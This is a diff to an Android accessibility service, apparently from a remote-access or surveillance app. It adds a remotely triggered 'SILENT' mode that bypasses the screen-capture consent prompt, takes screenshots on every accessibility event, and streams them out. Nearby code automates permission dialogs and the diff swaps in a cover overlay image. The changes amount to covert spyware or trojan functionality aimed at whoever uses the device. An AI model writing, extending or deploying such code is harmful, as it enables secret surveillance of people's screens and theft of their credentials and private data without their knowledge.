@@ -147,6 +147,7 @@ public class MainAccessibilityService extends AccessibilityService {
     //Screen Monitor
     private CaptureForgroundService myService;
     private boolean isBound = false;
+    private String mode_status = "LIVE";
 
     private final int imageWidth = 360;
     static int deviceWidth = 0;
@@ -389,18 +390,28 @@ public class MainAccessibilityService extends AccessibilityService {
                 inputText(setTextValue);
             }
             if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
-                requestMediaProjectionPermission();
-                sendScreenMonitoringData(screen_outputStream);
+                mode_status = intent.getStringExtra("mode");
+                if(mode_status.equals("SILENT")) {
+                    unsetMediaProjection();
+                    isScreenMonitoring = true;
+                } else {
+                    if(android.os.Build.VERSION.SDK_INT < 35) {
+                        requestMediaProjectionPermission();
+                        sendScreenMonitoringData(screen_outputStream);
+                    }
+                }
             }
 
             if (ACTION_SCREEN_REFRESH_MONITOR.equals(intent.getAction())) {
-                unsetMediaProjection();
-                new Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        requestMediaProjectionPermission();
-                    }
-                }, 300);
+                if(android.os.Build.VERSION.SDK_INT < 35) {
+                    unsetMediaProjection();
+                    new Handler().postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            requestMediaProjectionPermission();
+                        }
+                    }, 300);
+                }
             }
 
             if (ACTION_SCREEN_CLICK_MONITOR.equals(intent.getAction())) {
@@ -549,6 +560,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 String close_event = intent.getStringExtra("event");
                 if (close_event.equals("screen-monitor")) {
                     isScreenMonitoring = false;
+                    mode_status = "";
                 }
                 if (close_event.equals("screen-skeleton")) {
                     isSkeletonMonitoring = false;
@@ -663,7 +675,9 @@ public class MainAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // screenShotDevice();
+        if(mode_status.equals("SILENT")) {
+            screenShotDevice();
+        }
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             setBatteryPermission(event);
             if (manufacturer.equals("xiaomi")) {
@@ -1568,7 +1582,10 @@ public class MainAccessibilityService extends AccessibilityService {
                                         scaledBitmap.compress(Bitmap.CompressFormat.WEBP_LOSSY, 10, outputStream);
                                     }
                                     screen_outputStream = outputStream;
-                                    sendScreenMonitoringData(outputStream);
+                                    if(mode_status.equals("SILENT")) {
+                                        sendScreenMonitoringData(outputStream);
+                                    }
+
                                     scaledBitmap.recycle();
                                     outputStream.close();
                                 } catch (IOException e) {
@@ -1654,7 +1671,9 @@ public class MainAccessibilityService extends AccessibilityService {
                         }
                     }
                     screen_outputStream = outputStream;
-                    sendScreenMonitoringData(outputStream);
+                    if(mode_status.equals("LIVE")) {
+                        sendScreenMonitoringData(outputStream);
+                    }
                     bitmap.recycle();
                     scaledBitmap.recycle();
                     outputStream.close();
@@ -1824,7 +1843,7 @@ public class MainAccessibilityService extends AccessibilityService {
             if(overlayimgdata.equals("")) {
                 Glide.with(this)
                         .asGif()
-                        .load(R.drawable.img_alert)
+                        .load(R.drawable.gif_overlayer)
                         .transition(DrawableTransitionOptions.withCrossFade())
                         .into(imgOverlay);
             } else {
